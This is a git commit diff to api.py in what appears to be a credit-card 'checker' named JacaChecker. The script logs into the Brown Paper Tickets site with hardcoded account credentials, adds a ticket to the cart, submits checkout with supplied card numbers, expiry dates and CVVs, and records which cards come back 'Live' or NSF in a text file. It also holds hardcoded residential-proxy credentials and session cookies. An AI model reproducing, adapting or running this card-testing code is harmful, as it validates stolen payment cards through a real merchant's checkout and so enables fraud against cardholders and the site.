42533ace6904b2f26d18906caf6aa9f21f94aae9
jacagift2 <166268731+jacagift2@users.noreply.github.com>
2024-04-10 20:44:13 -0300

    Update api.py

--- api.py
+++ api.py
@@ -95,38 +95,43 @@ def checker(card, month, year, cvv):
         
         try:
             
-            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225'}
+            p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225'}
             
             if len(year) == 4:
                 year = year[2:]
-            url = "https://www.brownpapertickets.com/login.html"
-            payload = 'return_url=&login_fNhxLQgVEb=jacaccbot%40gmail.com&pass_uqKxazCZ9B=radask10'
+ 
+ 
+ 
+            url = "https://www.brownpapertickets.com/index.html"
+            payload = {}
             headers = {
-                'Host': 'www.brownpapertickets.com',
-                'Cache-Control': 'max-age=0',
-                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'Upgrade-Insecure-Requests': '1',
-                'Origin': 'https://www.brownpapertickets.com',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-User': '?1',
-                'Sec-Fetch-Dest': 'document',
-                'Referer': 'https://www.brownpapertickets.com/login.html',
-                'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-                'Cookie': 'allow_cookies="yes"; _gcl_au=1.1.2103056734.1712348265; _fbp=fb.1.1712348264986.1138458721; _pin_unauth=dWlkPVl6RTFNREk1Wm1ZdE9HVTRZeTAwTnpkakxUbGlOell0Tm1VMVlURm1Nemt3TVRSaA; _gid=GA1.2.404600766.1712440714; client_secure="I5YT8xAq2g2FN7v"; __utma=138453216.2130983608.1712348265.1712441874.1712441874.1; __utmc=138453216; __utmz=138453216.1712441874.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); bpt="4UUd.4UUddS8s-1712451486473"; language="en_US"; locale="en_US"; _gat_UA-114148720-1=1; _ga_J4R614QWT5=GS1.1.1712450084.4.1.1712451540.5.0.0; _ga=GA1.2.2130983608.1712348265; _derived_epik=dj0yJnU9ZGVDT0N2YURqRU11ZG5odDRLWUhvNXZXVm9RZk9mLXMmbj00QTJEUW5SY3FKVXMzNnA2b2laTlZ3Jm09MSZ0PUFBQUFBR1lVc3VVJnJtPTEmcnQ9QUFBQUFHWVVzdVUmc3A9Mg; _ga_W3XK1HZ6LH=GS1.1.1712450080.4.1.1712451544.0.0.0',
-                'Content-Type': 'application/x-www-form-urlencoded'
-                }
-            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p, allow_redirects=False)
-            client = response.cookies.get('client_secure') 
+            'Host': 'www.brownpapertickets.com',
+            'Cache-Control': 'max-age=0',
+            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Referer': 'https://www.brownpapertickets.com/checkout.html',
+            'Accept-Language': 'pt-PT,pt;q=0.9',
+            #'Cookie': 'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; client_secure="8nPuHrcJEZDRs7W"; _gat_UA-114148720-1=1; bpt="nAGY.nAGYgMDK-1712790582730"; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790582.24.0.0; _ga=GA1.1.1494828109.1712786777; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790582.0.0.0'
+            }
+
+            response = requests.request("GET", url, headers=headers, data=payload, verify=False)
+            email_id = pegarItem(response.text, '<INPUT TYPE="email" NAME="','" VALUE="Email or login"')
+            password = pegarItem(response.text, '<INPUT TYPE="password" NAME="','"')
             bpt = response.cookies.get('bpt')
+            print(response.headers)
+            print(response.cookies)
             
-            
-            url = "https://www.brownpapertickets.com/addtocart/4421337"
-            payload = 'event_id=4421337&date_id=2286982&price_7645526=5&price_7645527=5&country_id=31&shipping_2404336=4&shipping_2404337=4'
+
+            url = "https://www.brownpapertickets.com/login.html"
+            payload = f'{email_id}=suor_jose2daislv%40gmail.com&not_a_valid_field=Password&{password}=radask10'
             headers = {
                 'Host': 'www.brownpapertickets.com',
                 'Cache-Control': 'max-age=0',
@@ -141,85 +146,102 @@ def checker(card, month, year, cvv):
                 'Sec-Fetch-Mode': 'navigate',
                 'Sec-Fetch-User': '?1',
                 'Sec-Fetch-Dest': 'document',
-                'Referer': 'https://www.brownpapertickets.com/event/4421337',
-                'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-                'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.2103056734.1712348265; _fbp=fb.1.1712348264986.1138458721; _pin_unauth=dWlkPVl6RTFNREk1Wm1ZdE9HVTRZeTAwTnpkakxUbGlOell0Tm1VMVlURm1Nemt3TVRSaA; _gid=GA1.2.404600766.1712440714; __utma=138453216.2130983608.1712348265.1712441874.1712441874.1; __utmc=138453216; __utmz=138453216.1712441874.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); language="en_US"; locale="en_US"; client_secure={client}; _gat_UA-114148720-1=1; bpt={bpt}; _ga_J4R614QWT5=GS1.1.1712450084.4.1.1712451577.30.0.0; _ga=GA1.2.2130983608.1712348265; _derived_epik=dj0yJnU9ZGVDT0N2YURqRU11ZG5odDRLWUhvNXZXVm9RZk9mLXMmbj00QTJEUW5SY3FKVXMzNnA2b2laTlZ3Jm09MSZ0PUFBQUFBR1lVc3VVJnJtPTEmcnQ9QUFBQUFHWVVzdVUmc3A9Mg; _ga_W3XK1HZ6LH=GS1.1.1712450080.4.1.1712451586.0.0.0',
+                'Referer': 'https://www.brownpapertickets.com/index.html',
+                'Accept-Language': 'pt-PT,pt;q=0.9',
+                'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; _gat_UA-114148720-1=1; client_secure="CEZzL2De6JDbXn3"; bpt={bpt}; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790394.38.0.0; _ga=GA1.2.1494828109.1712786777; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790400.0.0.0',
                 'Content-Type': 'application/x-www-form-urlencoded'
                 }
-            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
-                                    
-                    
-                    
-            try:        
-                url = "https://www.brownpapertickets.com/checkout.html"
 
-                payload = f'payment_method=&final=1&browserinfo=24.false.1080.1920&attendee_fname=Clarkson&attendee_lname=Pesres&email=jacaccbot%40gmail.com&phone=661-214-7345&terms=t&billing_fname=Clarkson&billing_lname=Pesres&billing_address=23937%20Rancho%20Ct&billing_address_2=&billing_city=Valencia&billing_state=CA&billing_province=&billing_zip=91354&billing_country=United%20States&type=Visa&number={card}&code=222&expiry_month={month}&expiry_year={year}&issue_month=&issue_year=&issue_number='
-                headers = {
-                    'Host': 'www.brownpapertickets.com',
-                    'Cache-Control': 'max-age=0',
-                    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'Upgrade-Insecure-Requests': '1',
-                    'Origin': 'https://www.brownpapertickets.com',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'Sec-Fetch-Site': 'same-origin',
-                    'Sec-Fetch-Mode': 'navigate',
-                    'Sec-Fetch-User': '?1',
-                    'Sec-Fetch-Dest': 'document',
-                    'Referer': 'https://www.brownpapertickets.com/checkout.html',
-                    'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.2103056734.1712348265; _fbp=fb.1.1712348264986.1138458721; _pin_unauth=dWlkPVl6RTFNREk1Wm1ZdE9HVTRZeTAwTnpkakxUbGlOell0Tm1VMVlURm1Nemt3TVRSaA; _gid=GA1.2.404600766.1712440714; __utma=138453216.2130983608.1712348265.1712441874.1712441874.1; __utmc=138453216; __utmz=138453216.1712441874.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); language="en_US"; locale="en_US"; client_secure={client}; _gat_UA-114148720-1=1; bpt={bpt}; _ga_J4R614QWT5=GS1.1.1712450084.4.1.1712451577.30.0.0; _ga=GA1.2.2130983608.1712348265; _derived_epik=dj0yJnU9ZGVDT0N2YURqRU11ZG5odDRLWUhvNXZXVm9RZk9mLXMmbj00QTJEUW5SY3FKVXMzNnA2b2laTlZ3Jm09MSZ0PUFBQUFBR1lVc3VVJnJtPTEmcnQ9QUFBQUFHWVVzdVUmc3A9Mg; _ga_W3XK1HZ6LH=GS1.1.1712450080.4.1.1712451586.0.0.0',
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                    }
+            response = requests.request("POST", url, headers=headers, data=payload, verify=False)
+            client_secure = response.headers.get('client_secure')
+            
+      
+      
 
-                response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p, allow_redirects=False)
-                if "Redirection" in response.text:
-                    raise RequisicaoException()
+
+            url = "https://www.brownpapertickets.com/addtocart/6286439"
+            payload = 'event_id=6286439&date_id=2404827&price_7646712=1&country_id=228&shipping_2404827=4'
+            headers = {
+                'Host': 'www.brownpapertickets.com',
+                'Cache-Control': 'max-age=0',
+                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'Upgrade-Insecure-Requests': '1',
+                'Origin': 'https://www.brownpapertickets.com',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-User': '?1',
+                'Sec-Fetch-Dest': 'document',
+                'Referer': 'https://www.brownpapertickets.com/event/6286439',
+                'Accept-Language': 'pt-PT,pt;q=0.9',
+                'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; bpt={bpt}; client_secure={client_secure}; _gat_UA-114148720-1=1; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790490.55.0.0; _ga=GA1.2.1494828109.1712786777; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790499.0.0.0',
+                'Content-Type': 'application/x-www-form-urlencoded'
+                }
+            response = requests.request("POST", url, headers=headers, data=payload, verify=False)
+
+
+ 
+ 
+ 
+            url = "https://www.brownpapertickets.com/checkout.html"
+            payload = f'payment_method=&final=1&browserinfo=24.false.1080.1920&attendee_fname=james&attendee_lname=desn&email=suor_jose2daislv%40gmail.com&phone=6612147345&terms=t&billing_fname=james&billing_lname=dean&billing_address=23937%20Rancho%20Ct&billing_address_2=&billing_city=Valencia&billing_state=CA&billing_province=&billing_zip=91354&billing_country=United%20States&type=Visa&number={card}&code=222&expiry_month={month}&expiry_year={year}&issue_month=&issue_year=&issue_number='
+            headers = {
+                'Host': 'www.brownpapertickets.com',
+                'Cache-Control': 'max-age=0',
+                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'Upgrade-Insecure-Requests': '1',
+                'Origin': 'https://www.brownpapertickets.com',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-User': '?1',
+                'Sec-Fetch-Dest': 'document',
+                'Referer': 'https://www.brownpapertickets.com/checkout.html',
+                'Accept-Language': 'pt-PT,pt;q=0.9',
+                'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; bpt={bpt}; client_secure={client_secure}; _gat_UA-114148720-1=1; _ga=GA1.1.1494828109.1712786777; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790502.43.0.0; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790542.0.0.0',
+                'Content-Type': 'application/x-www-form-urlencoded'
+                }
+            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False)
+ 
+            if "Redirection" in response.text:
+                raise RequisicaoException()
+                
                     
-                        
-                        
+            if 'Invalid transaction' in response.text:
+                #code = response.json()['issuerResponseDetails']['issuerResponseCode']
+                bin = api_bin(card[:6])              
+                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19"                          
+                open("brownpapertickets.txt", "a").write(f"{card} {month} {year} {cvv} {bin} Retry 19 #JacaChecker\n") 
+                print(Fore.GREEN + f"{x} #JacaChecker")  
+                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}    
+                
+            elif 'Insufficient funds' in response.text:
+                bin = api_bin(card[:6])              
+                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF"                          
+                open("brownpapertickets.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF #JacaChecker\n") 
+                print(Fore.GREEN + f"{x} #JacaChecker")  
+                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                 
 
-
-
-                if 'Invalid transaction' in response.text:
-                    #code = response.json()['issuerResponseDetails']['issuerResponseCode']
-                    bin = api_bin(card[:6])              
-                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19"                          
-                    open("brownpapertickets.txt", "a").write(f"{card} {month} {year} {cvv} {bin} Retry 19 #JacaChecker\n") 
-                    print(Fore.GREEN + f"{x} #JacaChecker")  
-                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}    
                     
-                elif 'Insufficient funds' in response.text:
-                    bin = api_bin(card[:6])              
-                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF"                          
-                    open("brownpapertickets.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF #JacaChecker\n") 
-                    print(Fore.GREEN + f"{x} #JacaChecker")  
-                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
-                    
-                # elif 'issuerResponseCode":"46"' in response.text:
-                #     code = response.json()['issuerResponseDetails']['issuerResponseCode']
-                #     bin = api_bin(card[:6])              
-                #     x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Account Closed {code} "                          
-                #     print(Fore.RED + f"{x} #JacaChecker")  
-                    
-                        
-                elif 'The error returned by the credit card processor was' in response.text:
-                    response = pegarItem(response.text, 'The error returned by the credit card processor was:<BR><BR><CENTER>','</CENTER><BR><BR>')
-                    bin = api_bin(card[:6])
-                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {response}"     
-                    print(Fore.RED + f"{x} #JacaChecker")  
-                    return {"code": 1, "mensagem": f"{x} #JacaChecker<br>"}                        
+            elif 'The error returned by the credit card processor was' in response.text:
+                response = pegarItem(response.text, 'The error returned by the credit card processor was:<BR><BR><CENTER>','</CENTER><BR><BR>')
+                bin = api_bin(card[:6])
+                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {response}"     
+                print(Fore.RED + f"{x} #JacaChecker")  
+                return {"code": 1, "mensagem": f"{x} #JacaChecker<br>"}                        
 
-                else:
-                # print(Fore.LIGHTBLACK_EX + f"RETESTANDO: {x} #JacaChecker")    
-                    print(Fore.RED + 'Gateway Timeout' )
-                    return {"code": 1, "mensagem": "Gateway Timeout #JacaChecker<br>"} 
-            except:
-                print("reteste loco")
-                #reteste(card, month, year, cvv)     
+            else:
+            # print(Fore.LIGHTBLACK_EX + f"RETESTANDO: {x} #JacaChecker")    
+                print(Fore.RED + 'Gateway Timeout' )
+                return {"code": 1, "mensagem": "Gateway Timeout #JacaChecker<br>"} 
+
 
                         
         except requests.exceptions.ProxyError:
